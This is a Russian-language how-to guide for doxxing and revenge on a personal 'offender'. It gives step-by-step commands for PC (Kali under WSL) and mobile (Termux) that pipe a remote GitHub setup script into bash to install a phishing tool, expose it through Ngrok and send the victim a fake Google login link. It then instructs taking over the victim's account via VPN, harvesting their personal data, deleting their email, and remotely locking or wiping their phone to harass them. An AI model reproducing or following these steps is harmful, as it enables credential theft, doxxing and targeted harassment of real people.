Это гайд о том как найти данные и написать DOX на обидчика

У многих бывало когда к примеру оскорбили твою семью или тебя и ты ничего не можешь сделать кроме пустых слов

Работает не на всех, тем более в 2024 году.

PC: - Mobile

  • Активируй “Подсистема Windows для Linux” и "Платформа виртуальной машины" через Панель Управления
  • Перезагрузи компьютер
  • Открой cmd или PowerShell
  • Впиши в терминал "wsl --install Kali-Linux" без кавычек
  • Зарегистрируйся в Kali-Linux
  • Впиши в Kali-Linux поочерёдно
    1. super su
    2. Введи свой пароль который ты поставил (он не отображается при вводе)
    3. sudo apt update -y && sudo apt upgrade -y
    4. sudo apt-get install python3
    5. sudo wget -qO- https://github.com/Bhaviktutorials/shark/raw/master/setup | sudo bash
  • Зарегистрируйся/Войди на Ngrok
  • Нажми на "Your Authotoken"
  • Спиши оттуда свой токен (он не вставляется в терминал) и нажми на OK
  • Впиши в Kali-Linux "sudo shark"
  • Выбери любой сервис через который ты будешь ловить его данные
  • Впиши в Kali-Linux поочерёдно (будем делать 6, с гугла можно больше ценных даных забрать)
    1. 6
    2. a
    3. b
    4. n
  • Можно сделать при переходе на ссылку переадресацию на другой сайт если хочешь чтоб чел ничего не понял
  • Выбери порт (часто используемый "8080")
  • Если хочешь то можешь поменять вид ссылки но не меняй ссылку на другие сайты
  • Кидаем челу готовую ссылочку и ждём данных

Mobile: - PC

  • Установи Termux
  • Впиши в Termux поочерёдно
    1. pkg update -y
    2. pkg upgrade -y
    3. pkg install wget -y
    4. wget -qO- https://github.com/Bhaviktutorials/shark/raw/master/setup | bash
  • Зарегистрируйся/Войди на Ngrok
  • Нажми на "Your Authotoken"
  • Спиши оттуда свой токен (он не вставляется в терминал) и нажми на OK
  • Впиши в Termux "shark"
  • Выбери любой сервис через который ты будешь ловить его данные
  • Впиши в Termux поочерёдно (будем делать 6, с гугла можно больше ценных даных забрать)
    1. 6
    2. a
    3. b
    4. n
  • Можно сделать при переходе на ссылку переадресацию на другой сайт если хочешь чтоб чел ничего не понял
  • Выбери порт (часто используемый "8080")
  • Если хочешь то можешь поменять вид ссылки но не меняй ссылку на другие сайты
  • Кидаем челу готовую ссылочку и ждём данных

Если ты успешно забрал учётную запись обидчика то зайди на неё с VPN, попытайся найти максимум данных в его учётной записи начиная с ФИО а позже просто снеси ему почту

можно ужесточить и с помощью сайта “Найти устройство” издеваться над ним блокируя телефон или снести ему телефон до заводских настроек
